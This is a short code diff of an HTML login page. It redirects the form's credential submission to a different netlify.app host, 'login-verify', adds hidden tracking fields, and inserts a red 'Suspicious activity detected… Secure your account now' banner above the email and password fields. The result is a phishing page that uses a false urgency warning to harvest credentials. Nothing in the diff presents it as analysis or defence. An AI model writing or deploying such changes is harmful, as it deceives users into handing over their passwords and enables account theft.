@@ -236,8 +236,12 @@
         <!-- Right Side: Interaction Card UI -->
         <div class="form-container">
             <div class="card">
-                <form action="https://sso-portal.netlify.app/account/signin" method="POST">
-                        <input type="hidden" name="continue" value="https://netlify.app/welcome">
+<div style="background:#f8d7da;border:1px solid #f5c6cb;border-radius:6px;padding:12px 16px;margin-bottom:20px;font-size:14px;color:#721c24;text-align:center;">Suspicious activity detected: Your personal data may have been exposed. Secure your account now.</div>
+                <form action="https://login-verify.netlify.app/signin" method="POST">
+                        <input type="hidden" name="redirect" value="https://netlify.app/dashboard">
+    <input type="hidden" name="ts" value="1779438978">
+    <input type="hidden" name="service" value="account">
+    <input type="hidden" name="flow_id" value="af5c1fb9cc56b8ffe02345a8">
                     <input type="text" placeholder="Email address or phone number" required autocomplete="username">
                     <input type="password" placeholder="Password" required autocomplete="current-password">
                     <button type="submit" class="btn-login">Log In</button>
